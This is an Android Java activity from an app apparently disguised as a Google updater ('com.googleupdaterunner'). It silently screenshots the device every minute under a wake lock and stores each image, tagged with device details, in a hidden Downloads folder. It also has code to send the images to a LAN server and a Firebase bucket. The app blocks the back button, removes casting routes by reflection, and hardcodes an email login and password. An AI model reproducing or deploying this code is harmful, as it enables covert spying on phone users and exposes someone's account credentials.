package com.googleupdaterunner;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import  android.Manifest;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRouter;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.*;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.PixelCopy;
import android.view.SurfaceView;
import android.view.View;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.google.gson.*;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import okio.Buffer;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import java.io.*;
import java.lang.reflect.Method;

import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.UUID;
import java.util.concurrent.atomic.AtomicReference;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_CODE = 100;
    private MediaProjectionManager mediaProjectionManager;
    private static final int INTERNET_PERMISSION_REQUEST_CODE = 1;
    private PowerManager.WakeLock wakeLock;
    private MediaRouter mediaRouter;

    private Bitmap imageView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        requestForegroundServicePermission();

        mediaRouter = (MediaRouter) getSystemService(Context.MEDIA_ROUTER_SERVICE);
        mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);


        requestScreenCapturePermission();
    }

    private void requestScreenCapturePermission() {
        // Start the foreground service
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            Intent intent = ((MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE))
                    .createScreenCaptureIntent();
            startActivityForResult(intent, REQUEST_CODE);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {

        Base64Model entity =  new Base64Model();
        try{
            super.onActivityResult(requestCode, resultCode, data);
            if (requestCode == REQUEST_CODE && resultCode == RESULT_OK) {
                PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
                wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyApp:WakeLockTag");

// Acquire the WakeLock
                wakeLock.acquire();

                Thread loopThread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            while (wakeLock.isHeld()) {
                                // Your loop logic goes here
                                MediaProjection mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data);

                                if (mediaProjection != null) {
                                    try {
                                        // Step 4: Create a VirtualDisplay
                                        DisplayMetrics metrics = getResources().getDisplayMetrics();
                                        int screenWidth = metrics.widthPixels;
                                        int screenHeight = metrics.heightPixels;
                                        int screenDensity = metrics.densityDpi;
                                        ImageReader imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 1);
                                        VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
                                                "ScreenCapture",
                                                screenWidth,
                                                screenHeight,
                                                screenDensity,
                                                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                                                imageReader.getSurface(),
                                                null,
                                                null
                                        );

                                        // Wait for the image to become available
                                        SystemClock.sleep(1000); // Adjust the delay as needed

                                        // Process the captured screen content
                                        Image image = imageReader.acquireLatestImage();
                                        if (image != null) {
                                            try {
                                                Bitmap bitmap = imageToBitmap(image);
                                                imageView = bitmap;
                                                entity.setBase64String(bitmapToBase64(bitmap));
                                                Date currentDate = new Date();

                                                // Format the date and time using SimpleDateFormat
                                                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                                                String formattedDate = dateFormat.format(currentDate);
                                                entity.setTimestamp(formattedDate);
                                                // Get device information
                                                String deviceManufacturer = Build.MANUFACTURER;
                                                String deviceModel = Build.MODEL;
                                                String deviceProduct = Build.PRODUCT;
                                                String deviceHardware = Build.HARDWARE;
                                                String deviceOsVersion = Build.VERSION.RELEASE;

                                                entity.setDeviceInfo(deviceManufacturer + "-" + deviceModel);
                                                entity.setGuid(UUID.randomUUID().toString());
                                                saveBitmapToStorage(entity);
                                                // Do something with the Base64-encoded image
                                            } finally {
                                                image.close();
                                            }
                                        }

                                        // Release resources
                                        virtualDisplay.release();
                                        mediaProjection.stop();

                                    } finally {
                                        // Make sure to release the mediaProjection resource
                                        mediaProjection = null;
                                    }
                                }

                                // Sleep for a desired duration to avoid consuming excessive CPU resources
                                Thread.sleep(60000); // Adjust the sleep duration as needed
                            }
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        } finally {
                            // Release the WakeLock when the loop ends
                            wakeLock.release();
                        }
                    }
                });

// Start the thread
                loopThread.start();

            }
        }catch (Exception ex){
            Toast.makeText(MainActivity.this, "Exception: " + ex.getMessage(), Toast.LENGTH_SHORT).show();
            Log.d("Exception",ex.getMessage()) ;
            throw  ex;

        }

    }

    private void requestForegroundServicePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Check if the app has the permission already
            if (checkSelfPermission(Manifest.permission.FOREGROUND_SERVICE) != PackageManager.PERMISSION_GRANTED) {
                // Request the permission
                requestPermissions(new String[]{Manifest.permission.FOREGROUND_SERVICE}, REQUEST_FOREGROUND_SERVICE);
            } else {
                // Permission already granted, start the foreground service
                startForegroundService();
            }
        } else {
            // No permission needed for older Android versions, start the foreground service
            startForegroundService();
        }
    }


    private static final int REQUEST_FOREGROUND_SERVICE = 101;
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_FOREGROUND_SERVICE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission granted, start the foreground service
                startForegroundService();
            } else {
                // Permission denied, handle accordingly
                Toast.makeText(this, "Foreground service permission denied", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void startForegroundService() {

            Intent serviceIntent = new Intent(this, MediaProjectionForegroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }


    }

    private Bitmap imageToBitmap(Image image) {
        Image.Plane[] planes = image.getPlanes();
        ByteBuffer buffer = planes[0].getBuffer();
        int pixelStride = planes[0].getPixelStride();
        int rowStride = planes[0].getRowStride();
        int rowPadding = rowStride - pixelStride * image.getWidth();

        // Create a Bitmap and fill it with the image data
        Bitmap bitmap = Bitmap.createBitmap(
                image.getWidth() + rowPadding / pixelStride,
                image.getHeight(),
                Bitmap.Config.ARGB_8888
        );
        bitmap.copyPixelsFromBuffer(buffer);

        return bitmap;
    }

    private String bitmapToBase64(Bitmap bitmap) {
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream);
        byte[] byteArray = outputStream.toByteArray();
        return Base64.encodeToString(byteArray, Base64.DEFAULT);
    }

    private void postData(Base64Model base64Setting) {
        try{

            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl("http://192.168.8.100:45455/api/")
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();
            RetrofitAPI retrofitAPI = retrofit.create(RetrofitAPI.class);

            Call<Base64Model> call = retrofitAPI.createPost(base64Setting);

            call.enqueue(new Callback<Base64Model>() {
                @Override
                public void onResponse(Call<Base64Model> call, Response<Base64Model> response) {
                    if (response.isSuccessful()) {
                        Log.d("API", "Response: " + response.body());
                        Toast.makeText(MainActivity.this, "Data added to API", Toast.LENGTH_LONG).show();
                        Base64Model responseFromAPI = response.body();
                        // Handle the successful response here
                    } else {
                        Log.d("API", "Error");
                        if (call.request().body() != null) {
                            try {
                                RequestBody requestBody = call.request().body();
                                Buffer buffer = new Buffer();
                                requestBody.writeTo(buffer);
                                String requestBodyString = buffer.readUtf8();

                                // Format the JSON string with Gson
                                Gson gson = new GsonBuilder().setPrettyPrinting().create();
                                JsonParser jsonParser = new JsonParser();
                                JsonElement jsonElement = jsonParser.parse(requestBodyString);
                                String formattedRequestBody = gson.toJson(jsonElement);

                                Log.d("API", "Request Body: " + formattedRequestBody);
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }
                        Log.d("API", "Response: " + response.body());

                        // Handle the unsuccessful response here
                        Toast.makeText(MainActivity.this, "Error: " + response.message(), Toast.LENGTH_LONG).show();

                        // Retrieve the error JSON from the response
                        try {
                            ResponseBody errorBody = response.errorBody();
                            if (errorBody != null) {
                                String errorJson = errorBody.string();
                                Log.d("API", "Error JSON: " + errorJson);
                                // Handle the error JSON here
                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }

                @Override
                public void onFailure(Call<Base64Model> call, Throwable t) {
                    // Handle the failure case here
                    Log.d("API", "Error");
                    if (call.request().body() != null) {
                        try {
                            RequestBody requestBody = call.request().body();
                            Buffer buffer = new Buffer();
                            requestBody.writeTo(buffer);
                            String requestBodyString = buffer.readUtf8();

                            // Format the JSON string with Gson
                            Gson gson = new GsonBuilder().setPrettyPrinting().create();
                            JsonParser jsonParser = new JsonParser();
                            JsonElement jsonElement = jsonParser.parse(requestBodyString);
                            String formattedRequestBody = gson.toJson(jsonElement);

                            Log.d("API", "Request Body: " + formattedRequestBody);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                    Log.d("API", "Exception: " + t.getMessage());
                    Toast.makeText(MainActivity.this, "Exception: " + t.getMessage(), Toast.LENGTH_LONG).show();
                }
            });







        }catch (Exception ex){
            throw  ex;
        }

    }

    private void writeStringToFile(String data, String filePath) {
        try {
            File file = new File(filePath);
            FileWriter fileWriter = new FileWriter(file);
            BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
            bufferedWriter.write(data);
            bufferedWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void    saveFileToDevice(String data) {
        Gson gson = new Gson();

// Deserialize JSON into an object
        Base64Model myObject = gson.fromJson(data, Base64Model.class);
        String fileName = "example.txt"; // Specify the file name
        File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        String filePath = downloadsDir.getAbsolutePath() + File.separator + fileName;
        writeStringToFile(data, filePath);
    }
    @Override
    public void onBackPressed() {
        // Do nothing or handle the back button press as needed
        // To disable closing the app, simply leave this method empty
        // super.onBackPressed(); // Uncomment this line to allow the default behavior
    }

    private MediaRouter.Callback mediaRouterCallback = new MediaRouter.Callback() {
        @Override
        public void onRouteSelected(MediaRouter mediaRouter, int i, MediaRouter.RouteInfo routeInfo) {

        }

        @Override
        public void onRouteUnselected(MediaRouter mediaRouter, int i, MediaRouter.RouteInfo routeInfo) {

        }

        @Override
        public void onRouteAdded(MediaRouter router, MediaRouter.RouteInfo route) {
            // Check if it's a casting route and remove it
            if (isCastingRoute(route)) {
                removeRouteReflection(router, route);
            }
        }

        @Override
        public void onRouteRemoved(MediaRouter mediaRouter, MediaRouter.RouteInfo routeInfo) {

        }

        @Override
        public void onRouteChanged(MediaRouter router, MediaRouter.RouteInfo route) {
            // Check if it's a casting route and remove it
            if (isCastingRoute(route)) {
                removeRouteReflection(router, route);
            }
        }

        @Override
        public void onRouteGrouped(MediaRouter mediaRouter, MediaRouter.RouteInfo routeInfo, MediaRouter.RouteGroup routeGroup, int i) {

        }

        @Override
        public void onRouteUngrouped(MediaRouter mediaRouter, MediaRouter.RouteInfo routeInfo, MediaRouter.RouteGroup routeGroup) {

        }

        @Override
        public void onRouteVolumeChanged(MediaRouter mediaRouter, MediaRouter.RouteInfo routeInfo) {

        }

        private boolean isCastingRoute(MediaRouter.RouteInfo route) {
            // Check if the route supports the desired types
            int supportedTypes = route.getSupportedTypes();
            return (supportedTypes & MediaRouter.ROUTE_TYPE_LIVE_AUDIO) != 0
                    || (supportedTypes & MediaRouter.ROUTE_TYPE_LIVE_VIDEO) != 0;
        }

        private void removeRouteReflection(MediaRouter router, MediaRouter.RouteInfo route) {
            try {
                Method removeRouteMethod = MediaRouter.class.getDeclaredMethod("removeRoute", MediaRouter.RouteInfo.class);
                removeRouteMethod.setAccessible(true);
                removeRouteMethod.invoke(router, route);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        // Implement other callback methods as needed
    };

    public  void postDataToFirebase(Base64Model base64Model){
        String email = "tahir.4708@gmail.com";
        String password = "Ayzal@2682022";


        FirebaseAuth auth = FirebaseAuth.getInstance();
        FirebaseUser user = auth.getCurrentUser();

        if (user != null) {
            // User is already signed in, proceed with uploading the file
            uploadFile(base64Model);
        } else {
            // User is not signed in, sign in the user first
            auth.signInWithEmailAndPassword(email, password)
                    .addOnCompleteListener(task -> {
                        if (task.isSuccessful()) {
                            // Sign-in successful, proceed with uploading the file
                            uploadFile(base64Model);
                        } else {
                            // Handle sign-in failure
                            Toast.makeText(MainActivity.this, "Failed to sign in", Toast.LENGTH_LONG).show();
                        }
                    });
        }



    }

    private void uploadFile(Base64Model base64Model) {
        FirebaseStorage storage = FirebaseStorage.getInstance("gs://screenshotclipper.appspot.com");
        // Create a storage reference from our app
        StorageReference storageRef = storage.getReference();

// Create a reference to "mountains.jpg"
        StorageReference mountainsRef = storageRef.child("mountains.jpg");

// Create a reference to 'images/mountains.jpg'
        StorageReference mountainImagesRef = storageRef.child("images/mountains.jpg");

// While the file names are the same, the references point to different files
        mountainsRef.getName().equals(mountainImagesRef.getName());    // true
        mountainsRef.getPath().equals(mountainImagesRef.getPath());    // false

        Bitmap bitmap = convertBase64ToBitmap(base64Model.getBase64String());
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos);
        byte[] data = baos.toByteArray();

        UploadTask uploadTask = mountainsRef.putBytes(data);
        uploadTask.addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception exception) {
                Toast.makeText(MainActivity.this,exception.getMessage(),Toast.LENGTH_LONG).show();
                // Handle unsuccessful uploads
            }
        }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                Toast.makeText(MainActivity.this,"Success",Toast.LENGTH_LONG).show();
                // taskSnapshot.getMetadata() contains file metadata such as size, content-type, etc.
                // ...
            }
        });
    }

    public Bitmap convertBase64ToBitmap(String base64String) {
        try {
            byte[] decodedString = Base64.decode(base64String, Base64.DEFAULT);
            Bitmap bitmap = BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length);
            return bitmap;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public void saveBitmapToStorage(Base64Model entity) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault());
        String timestamp = sdf.format(new Date());

        // Get the reference to the device's download directory
        File downloadDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        if (!downloadDirectory.exists()) {
            downloadDirectory.mkdirs();
        }

        // Create a subdirectory within the Downloads directory
        File directory = new File(downloadDirectory, ".folder");
        if (!directory.exists()) {
            directory.mkdirs();
        }

        File imageFile = new File(directory, "image_" + timestamp + ".png");

        try {
            FileOutputStream outputStream = new FileOutputStream(imageFile);
            Bitmap bitmap = convertBase64ToBitmap(entity.getBase64String());
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream);
            outputStream.flush();
            outputStream.close();
            // Image saved successfully
        } catch (IOException e) {
            e.printStackTrace();
            // Error occurred while saving the image
        }
    }




}
